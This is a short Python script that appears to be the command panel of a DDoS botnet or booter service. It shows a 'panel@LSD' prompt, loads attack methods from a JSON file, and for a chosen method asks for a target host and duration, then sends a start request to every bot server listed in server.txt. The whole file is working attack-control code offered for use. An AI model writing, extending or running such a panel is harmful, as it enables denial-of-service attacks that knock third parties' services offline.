import design
import requests as req
import json

with open("methods.json", "r",encoding='utf-8') as file:
    jsonn = json.load(file)

names = []
use = []
for text in jsonn['methods']:
    names.append(f"{text['name']}")
    use.append(f"{text['use']}")

def main():
    des = design.design()
    des.logo()
    while True:
        what = input('panel@LSD:~$')
        if what == "./help" or what == "help":
            des.help()
        elif what == "./bots":
            des.bots()
        elif what == "./methods":
            des.methods()

        elif what in names:
            host = input("host:")
            time = input("time:")
            with open('server.txt', "r") as file:
                while True:
                    line = file.readline()
                    if not line:
                        break
                    req.get(f"{line}/start?target={host}&method={what}&type=1&time={time}")
                    
        else:
            des.help()

if __name__ == '__main__':
    main()
